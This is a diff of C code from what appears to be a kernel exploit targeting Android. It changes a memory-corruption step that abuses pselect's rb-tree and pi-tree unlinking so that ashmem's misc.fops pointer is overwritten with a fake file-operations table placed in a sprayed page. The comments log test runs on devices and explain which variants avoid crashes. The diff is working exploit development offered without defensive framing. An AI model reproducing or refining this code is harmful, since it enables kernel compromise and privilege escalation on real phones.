@@ -1166,23 +1166,26 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * objects on the same page as fake_fops. BSS lock + heap
              * fake_fops as rb parent KPd at pselect (16:02 / 16:07).
              */
-            /* DUAL-TREE CLEAN SWAP (fire-4 lesson: only-right variant
-             * crashed at the walk; only-left + red is the 2x-proven
-             * walk-stable class). Both trees aim the slot:
-             *   main: pc = T|1 (red, NO rebalance) — stores T|1 first
-             *   pi:   pi_pc = T (CLEAN) — the dequeue_pi erase overwrites
-             *         the slot with the aligned pointer. pi-left-child
-             *         rebalance (T is black) walks T's own fields = our
-             *         zeroed sprayed page = defined/safe. Final value in
-             *         *misc.fops = clean T. */
-            tree_pc = (uint64_t)fake_fops | 1ULL;
+            /* PI-ONLY CLEAN SWAP (fire-5 refinement): the main tree
+             * carries ALL-ZERO words — the settle-era "pure unlink"
+             * shape that walked clean (no store-1/2, no rebalance).
+             * The pi tree alone performs the swap — the DATAONLY-proven
+             * pi-write mechanism (pi erase: *pi_left = pi_pc):
+             *   pi_pc   = fake_fops  (CLEAN aligned pointer, bit0=0)
+             *   pi_left = &misc.fops (the target)
+             * pi rebalance (black): sibling = *(T+8) = llseek = 0 in the
+             * stage-1 table → NULL-sibling case walks up T's parent =
+             * owner = 0 → terminates. change_child writes &slot into
+             * T+8 (llseek) — the survivable clobber from fires 2/3.
+             * Every write lands in {slot, our sprayed page, our lock}. */
+            tree_pc = 0;
             tree_r = 0;
-            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
-                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
-                                : ASHMEM_MISC_FOPS_OFF));
+            tree_l = 0;
             pi_parent = (uint64_t)fake_fops;
             pi_right = 0;
-            pi_left = tree_l;
+            pi_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                                : ASHMEM_MISC_FOPS_OFF));
             stack_task = fake_task;
             stack_lock = fake_lock;
             /* prio MUST be 0 (09-13 device evidence: every surviving walk
@@ -1190,10 +1193,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * rate across park/cred/oracle classes). */
             stack_prio = 0;
             stack_deadline = 0;
-            pr_info("stack SLIDE_SWAP dual-tree: main *%016llx = %016llx "
-                    "(red) then pi overwrite -> clean %016llx lock=spray\n",
-                    (unsigned long long)tree_l,
-                    (unsigned long long)tree_pc,
+            pr_info("stack SLIDE_SWAP pi-only: *%016llx = %016llx (clean) "
+                    "main=all-zero lock=spray\n",
+                    (unsigned long long)pi_left,
                     (unsigned long long)pi_parent);
           } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
             /*
